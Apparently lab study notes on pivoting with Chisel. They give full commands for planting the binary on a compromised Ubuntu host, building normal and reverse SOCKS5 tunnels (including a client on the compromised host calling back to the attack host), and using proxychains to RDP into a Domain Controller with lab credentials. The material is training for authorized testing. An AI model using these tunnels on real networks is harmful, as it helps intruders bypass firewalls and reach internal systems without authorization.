# 1. 🧠 What Is Chisel?

**Chisel** is a TCP/UDP-based tunneling tool written in **Go**.

It uses:

```text
HTTP
  +
SSH-secured transport
  ↓
Tunneling
```

The supplied material describes Chisel as a tool that can create a **client-server tunnel connection in a firewall-restricted environment**.

The particularly important feature in this section is:

> **SOCKS5 tunneling**

---

# 2. 🎯 Why Do We Use Chisel?

Consider this network:

```text
Attack Host
    │
    │ ❌ No direct route
    │
    ▼
Domain Controller
172.16.5.19
```

The attack host and Domain Controller belong to different network segments.

However, we have compromised an Ubuntu server that can access the internal network:

```text
Attack Host
    │
    ▼
Ubuntu Pivot
    │
    ▼
172.16.5.0/23
    │
    ▼
DC: 172.16.5.19
```

Chisel allows us to establish a tunnel through the Ubuntu pivot.

---

# 3. 🖼️ Chisel Architecture

![Image](https://images.openai.com/static-rsc-4/Cp0efEuD7hBA2Py_w3ZwNDjoEM414_QlXyisrhJsVmARXLy6dailGy8EiZ8gpNLm8so2JGQnkB2M8V9mb0DZxZM4rbVt-SMCYkmFJ3W2mCKQ2HyrpU8qYUK4VxlwNGgdXYTJnsPMNS1Tf7CY46Q7T3lmJODtwgbjHlSV86-xBi7gvIKsztPWZUD33RcqPdbC?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/b0OmuqNYEcQzZxUei5Vix9ZU-iqf0ibZjSqTNBgylU3MXfOb585_Xt_1n3iM3rgEr7bSpEQy0lllgrqX-8huK71lkKnXVGfdfLikXnryt_Rr2hDdrSv2gAbdLvfiYVnKwcCbwuU4-Z7rtive4NVgFD3w5iCiXFHqLaK-obWm8BrlxHlwtcFCe4NQylalGt1u?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/9h63tC6g--IPCOlyFn5aDQ9uvBuK5IXZMmDVcZV14nR0s5p_3bcZ7GA7Zfbs7fA7ioJrltCaIsn54KEnoeRYdTLVIdWhc1H8F9RZB5MRuR7ImEITqVy9OF4mc2ihzwxz5457NmFmCsvR8vuD7iPZlOBy6quy1C7Ql39IMjGZrb6hcl6ZQPP8lkh_g8hye3q7?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/KtuRCCcF_Izo0btGuOLd-rbdgLGAN1ouaZz0I9tKPFyU9d0RK5VRXVN6D3uDnPzrqweh7vyRgZwa3yLcNoD_ysbBcjfCDJxiKDqlVCP-8yRsOXZC4vr9Tb5OiRgh6vR3aMpl9zcSWJHHlgH8z-Y8w8NXcg1Il_Z05Vmao1K-XkiZuOf_NU5kWfFhGmey0F38?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/4G_JoIlXXvr0tdWLtbYX0ulFA6_r2xSseyeBfj4VKgCn9coCCHQBuQZvSh13s28d23wAsgYO-pkIQ5pjzJ40aR-okZJiFrF0Ey_4V5rg8zITJ1L29RHQ4MiWgBibTRNWv6XmU1DvwpTTwW-KOvKfnbrjgvWKtnT56KCbYo0htIZdAvBqrDbIJ03nDziHogJj?purpose=fullsize)

The basic architecture is:

```text
                    ATTACK HOST
                         │
                         │ Chisel Client
                         │
                    SOCKS5 :1080
                         │
                         ▼
                  Chisel Tunnel
                         │
                         ▼
                  Ubuntu Pivot
                   10.129.202.64
                         │
                         │
                         ▼
                 Internal Network
                  172.16.5.0/23
                         │
                         ▼
                Domain Controller
                   172.16.5.19
```

---

# 4. 🔑 Important Chisel Concepts

Remember these terms:

|Term|Meaning|
|---|---|
|**Chisel Server**|Listens for Chisel client connections|
|**Chisel Client**|Connects to the Chisel server|
|**SOCKS5**|Proxy protocol used to route traffic|
|**Tunnel**|Communication path between client and server|
|**Pivot Host**|Compromised system used to access another network|
|**Reverse Pivot**|Client connects outward to attack host when inbound access is restricted|
|`--socks5`|Enables SOCKS5 functionality|
|`--reverse`|Enables reverse tunneling|
|`R:socks`|Creates a reversed SOCKS connection|

---

# 5. 🛠️ Step 1 — Clone Chisel

If Chisel isn't already available:

```bash
git clone https://github.com/jpillora/chisel.git
```

This downloads the Chisel source code.

---

# 6. 🐹 Chisel Is Written in Go

Chisel is written in:

```text
Go
```

Therefore, the Go compiler is needed to build the binary.

Move into the project directory:

```bash
cd chisel
```

Then build:

```bash
go build
```

This produces the Chisel binary.

---

# 7. ⚠️ Important: `glibc` Compatibility

The supplied material highlights an important issue:

> Depending on the version of the `glibc` library installed on the target and workstation, discrepancies can cause errors.

So if a Chisel binary doesn't work on the target, compare the relevant library versions.

Another option mentioned by the source is to use an **older prebuilt Chisel version** from the GitHub Releases section.

### Remember:

```text
Chisel doesn't work
        ↓
Check compatibility
        ↓
glibc versions
        ↓
If necessary
        ↓
Try another Chisel release
```

---

# 8. 📦 Binary Size

The source also emphasizes considering the size of files transferred to a client's network.

The supplied example shows:

```text
chisel
100% 11MB
```

Large binaries can have implications for:

- Transfer performance
    
- Detection
    
- Operational considerations during an engagement
    

The source recommends additional reading from **0xdf** and **IppSec** for this concept.

---

# 9. 🚚 Step 2 — Transfer Chisel to the Pivot

The supplied command:

```bash
scp chisel ubuntu@10.129.202.64:~/
```

This transfers the Chisel binary to the Ubuntu pivot host.

The example uses:

```text
Pivot IP:
10.129.202.64
```

---

# 10. 🧩 First Architecture: Normal Chisel Pivot

In the first configuration:

```text
Ubuntu
   ↓
Chisel Server
   ↓
Attack Host
   ↓
Chisel Client
   ↓
SOCKS5
```

More precisely:

```text
Attack Host
    │
    │ Chisel Client
    ▼
Ubuntu Pivot
    │
    │ Access to internal network
    ▼
172.16.5.0/23
```

---

# 11. 🚀 Step 3 — Start Chisel Server on Pivot

On Ubuntu:

```bash
./chisel server -v -p 1234 --socks5
```

The important parameters are:

```text
-v
-p 1234
--socks5
```

---

# 12. 🔍 Breaking Down the Server Command

### `./chisel`

Runs the Chisel binary.

### `server`

Starts Chisel in server mode.

### `-v`

Enables verbose output.

### `-p 1234`

Chisel server listens on:

```text
1234
```

### `--socks5`

Enables SOCKS5 functionality.

---

# 13. 📋 Server Output

The supplied output:

```text
2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

The important information:

```text
Protocol:
HTTP

Listen address:
0.0.0.0

Port:
1234
```

---

# 14. 🧠 What Does `0.0.0.0` Mean Here?

The server is listening on:

```text
0.0.0.0:1234
```

This means it is listening on the available network interfaces rather than being restricted to one specific interface address.

---

# 15. 🔄 What Does `--socks5` Do?

The supplied material states that the Chisel listener will listen for incoming connections using:

```text
SOCKS5
```

and forward traffic to networks accessible from the pivot host.

In this case, Ubuntu has access to:

```text
172.16.5.0/23
```

Therefore, traffic can be routed toward hosts on that network.

---

# 16. 🚀 Step 4 — Connect Chisel Client

On the attack host:

```bash
./chisel client -v 10.129.202.64:1234 socks
```

This connects to:

```text
10.129.202.64:1234
```

where the Chisel server is running.

---

# 17. 🔍 Breaking Down the Client Command

```text
./chisel
```

Run Chisel.

```text
client
```

Start client mode.

```text
-v
```

Verbose output.

```text
10.129.202.64:1234
```

Chisel server address.

```text
socks
```

Create the SOCKS proxy.

---

# 18. ⭐ Important Output

The supplied output contains:

```text
client: tun: proxy#127.0.0.1:1080=>socks: Listening
```

This is extremely important.

It means the Chisel client creates a local SOCKS proxy on:

```text
127.0.0.1:1080
```

So the attack host can send traffic into:

```text
127.0.0.1:1080
```

and Chisel transports it through the tunnel.

---

# 19. 🖼️ Traffic Flow

```text
Attack Host
     │
     │
     ▼
127.0.0.1:1080
     │
     │ SOCKS5
     ▼
Chisel Client
     │
     │ HTTP/SSH-secured tunnel
     ▼
Chisel Server
     │
     │
     ▼
Ubuntu Pivot
     │
     ▼
172.16.5.0/23
```

---

# 20. 🔐 Chisel's Transport

The source explains that Chisel creates a:

> **TCP/UDP tunnel via HTTP secured using SSH**

So conceptually:

```text
Application Traffic
       ↓
SOCKS5
       ↓
Chisel
       ↓
HTTP transport
       ↓
SSH security
       ↓
Pivot
       ↓
Internal Network
```

---

# 21. 📋 Important Client Output

The supplied output:

```text
client: Connecting to ws://10.129.202.64:1234
```

Then:

```text
client: tun: proxy#127.0.0.1:1080=>socks: Listening
```

Then:

```text
client: tun: Bound proxies
```

Then:

```text
client: Handshaking...
client: Sending config
client: Connected
client: tun: SSH connected
```

These lines indicate that the tunnel has successfully been established.

---

# 22. 🛠️ Step 5 — Configure Proxychains

Now that Chisel provides:

```text
127.0.0.1:1080
```

we can configure Proxychains to use it.

The configuration file is:

```text
/etc/proxychains.conf
```

---

# 23. 📄 Proxychains Configuration

The supplied configuration:

```text
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080
```

The important line is:

```text
socks5 127.0.0.1 1080
```

---

# 24. 🧠 What Does This Configuration Mean?

It tells Proxychains:

```text
Use SOCKS5
      ↓
127.0.0.1
      ↓
Port 1080
```

So:

```text
Proxychains
     ↓
127.0.0.1:1080
     ↓
Chisel
     ↓
Ubuntu Pivot
     ↓
Internal Network
```

---

# 25. 🔎 Verify Configuration

The supplied method uses:

```bash
tail -f /etc/proxychains.conf
```

You should see:

```text
[ProxyList]
socks5 127.0.0.1 1080
```

---

# 26. 🎯 Step 6 — Pivot to the Domain Controller

The Domain Controller is:

```text
172.16.5.19
```

The supplied command:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

This sends the RDP connection through Proxychains.

---

# 27. 🧠 Complete Normal Chisel Flow

```text
                 ATTACK HOST
                      │
                      │
                 Proxychains
                      │
                      ▼
              127.0.0.1:1080
                      │
                      ▼
                Chisel Client
                      │
             HTTP + SSH tunnel
                      │
                      ▼
                Chisel Server
                      │
                      ▼
                 Ubuntu Pivot
                      │
                      ▼
                172.16.5.0/23
                      │
                      ▼
              DC: 172.16.5.19
                      │
                      ▼
                     RDP
```

---

# 28. 🔥 Chisel Reverse Pivot

The second part is extremely important.

Sometimes the firewall prevents:

```text
Attack Host → Pivot
```

directly.

For example:

```text
Attack Host
     │
     │ ❌ inbound blocked
     ▼
Compromised Ubuntu
```

But the Ubuntu machine may be allowed to make an **outbound connection** to the attack host.

In that situation, Chisel can use **reverse tunneling**.

---

# 29. 🧠 Normal vs Reverse Chisel

### Normal

```text
Attack Host
     │
     │ Connect
     ▼
Chisel Server
     │
     ▼
Pivot
```

### Reverse

```text
Attack Host
     │
     │ Chisel Server
     │
     ▲
     │ Outbound connection
     │
Ubuntu Pivot
     │
     ▼
Internal Network
```

---

# 30. 🚀 Step 7 — Start Reverse Chisel Server

On the attack host:

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

The critical option is:

```text
--reverse
```

---

# 31. 🔍 Meaning of `--reverse`

When the server is started with:

```text
--reverse
```

Chisel allows **reverse remotes**.

The supplied material explains:

> Remotes can be prefixed with `R` to denote reversed.

The special remote:

```text
R:socks
```

creates a reversed SOCKS connection.

---

# 32. 📋 Reverse Server Output

The supplied output:

```text
server: Reverse tunnelling enabled
```

confirms that reverse tunneling is enabled.

Then:

```text
server: Listening on http://0.0.0.0:1234
```

So the attack host's Chisel server is listening on:

```text
0.0.0.0:1234
```

---

# 33. 🚀 Step 8 — Connect Pivot to Attack Host

On Ubuntu:

```bash
./chisel client -v 10.10.14.17:1234 R:socks
```

Notice the important difference:

Normal:

```text
socks
```

Reverse:

```text
R:socks
```

---

# 34. 🧠 What Does `R:socks` Mean?

Break it into:

```text
R
+
socks
```

### `R`

Reverse tunnel.

### `socks`

SOCKS functionality.

Therefore:

```text
R:socks
```

means a **reverse SOCKS tunnel**.

---

# 35. 🔄 Reverse Architecture

```text
                    ATTACK HOST
                  10.10.14.17
                        │
                        │
                 Chisel Server
                  --reverse
                        │
                        ▲
                        │
                 Outbound connection
                        │
                        │
                 Ubuntu Pivot
                        │
                        ▼
                Internal Network
                        │
                        ▼
                172.16.5.19
```

---

# 36. 📌 Reverse SOCKS Port

The supplied material states that:

```text
R:socks
```

will listen on the server's default SOCKS port:

```text
1080
```

Therefore, Proxychains can still use:

```text
socks5 127.0.0.1 1080
```

---

# 37. 🛠️ Step 9 — Configure Proxychains for Reverse Pivot

Again:

```text
/etc/proxychains.conf
```

Add:

```text
socks5 127.0.0.1 1080
```

---

# 38. 🎯 Step 10 — RDP Through Reverse Chisel

The supplied command remains:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

The difference is **how the SOCKS connection reaches the internal network**.

---

# 39. 🆚 Normal Chisel vs Reverse Chisel

|Feature|Normal|Reverse|
|---|---|---|
|Server|Ubuntu pivot|Attack host|
|Client|Attack host|Ubuntu pivot|
|Server option|`server -p 1234 --socks5`|`server --reverse -p 1234 --socks5`|
|Client remote|`socks`|`R:socks`|
|SOCKS port|`1080`|`1080`|
|Useful when|Attack host can reach pivot|Pivot can make outbound connection|
|Main idea|Direct tunnel|Reverse tunnel|

---

# 40. 🧠 Most Important Difference

### Normal:

```bash
# Ubuntu
./chisel server -v -p 1234 --socks5
```

```bash
# Attack Host
./chisel client -v 10.129.202.64:1234 socks
```

### Reverse:

```bash
# Attack Host
sudo ./chisel server --reverse -v -p 1234 --socks5
```

```bash
# Ubuntu
./chisel client -v 10.10.14.17:1234 R:socks
```

---

# 41. 🔥 Commands You Should Memorize

### Clone

```bash
git clone https://github.com/jpillora/chisel.git
```

### Build

```bash
cd chisel
go build
```

### Transfer

```bash
scp chisel ubuntu@10.129.202.64:~/
```

### Normal server

```bash
./chisel server -v -p 1234 --socks5
```

### Normal client

```bash
./chisel client -v 10.129.202.64:1234 socks
```

### Proxychains

```text
socks5 127.0.0.1 1080
```

### RDP

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Reverse server

```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```

### Reverse client

```bash
./chisel client -v 10.10.14.17:1234 R:socks
```

---

# 42. 🧠 The Numbers to Remember

From the supplied lab:

```text
┌──────────────────────────────┐
│ Attack Host                  │
│ 10.10.14.17                  │
└──────────────────────────────┘

┌──────────────────────────────┐
│ Ubuntu Pivot                 │
│ 10.129.202.64                │
└──────────────────────────────┘

┌──────────────────────────────┐
│ Internal Network             │
│ 172.16.5.0/23                │
└──────────────────────────────┘

┌──────────────────────────────┐
│ Domain Controller            │
│ 172.16.5.19                  │
└──────────────────────────────┘

Chisel Server:
1234

SOCKS:
1080

RDP:
3389
```

---

# 43. 📝 Viva Questions

### Q1. What is Chisel?

A TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data secured using SSH.

### Q2. What proxy protocol is used in this section?

**SOCKS5**

### Q3. What port does the local SOCKS proxy use?

```text
1080
```

### Q4. What port does the Chisel server use in the example?

```text
1234
```

### Q5. What network are we trying to reach?

```text
172.16.5.0/23
```

### Q6. What is the Domain Controller's IP?

```text
172.16.5.19
```

### Q7. What option enables SOCKS5?

```text
--socks5
```

### Q8. What option enables reverse tunneling?

```text
--reverse
```

### Q9. What does `R:socks` mean?

A reversed SOCKS remote.

### Q10. Where is the Proxychains configuration file?

```text
/etc/proxychains.conf
```

### Q11. What line is added to Proxychains?

```text
socks5 127.0.0.1 1080
```

### Q12. What tool is used to RDP into the DC?

```text
xfreerdp
```

### Q13. What does `go build` do?

Builds the Chisel binary from its Go source code.

### Q14. Why might a Chisel binary fail on a target?

The supplied material specifically points to possible **`glibc` version discrepancies** between systems.

---

# 44. ⚡ One-Minute Revision

## Normal Chisel

```text
ATTACK HOST
    │
    │ Chisel Client
    ▼
127.0.0.1:1080
    │
    ▼
Chisel Tunnel
    │
    ▼
UBUNTU PIVOT
    │
    ▼
172.16.5.0/23
    │
    ▼
172.16.5.19
```

Commands:

```bash
# Pivot
./chisel server -v -p 1234 --socks5
```

```bash
# Attack Host
./chisel client -v 10.129.202.64:1234 socks
```

```text
# Proxychains
socks5 127.0.0.1 1080
```

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

# 45. 🔄 Reverse Chisel

```text
ATTACK HOST
    │
    │ Chisel Server
    │ --reverse
    ▲
    │
    │ Outbound connection
    │
UBUNTU PIVOT
    │
    ▼
INTERNAL NETWORK
    │
    ▼
172.16.5.19
```

Commands:

```bash
# Attack Host
sudo ./chisel server --reverse -v -p 1234 --socks5
```

```bash
# Ubuntu
./chisel client -v 10.10.14.17:1234 R:socks
```

Then:

```text
socks5 127.0.0.1 1080
```

and:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

# 🏆 46. Ultimate Memory Trick

Remember **C-S-P-R**:

### **C — Chisel**

Creates the tunnel.

### **S — SOCKS5**

Provides the proxy.

### **P — Proxychains**

Sends applications through the SOCKS proxy.

### **R — RDP**

Uses the tunnel to reach the internal Windows service.

```text
CHISEL
   ↓
SOCKS5 :1080
   ↓
PROXYCHAINS
   ↓
RDP :3389
   ↓
DC 172.16.5.19
```

And for reverse tunneling:

```text
Normal:
socks

Reverse:
R:socks
```

> **Core concept:** Chisel creates an HTTP-transported, SSH-secured tunnel between a client and server, exposes a SOCKS5 proxy on `127.0.0.1:1080`, and allows tools such as `proxychains` to route traffic toward networks reachable from the pivot host. With `--reverse` and `R:socks`, the connection direction is reversed to work around situations where inbound connectivity to the compromised host is restricted.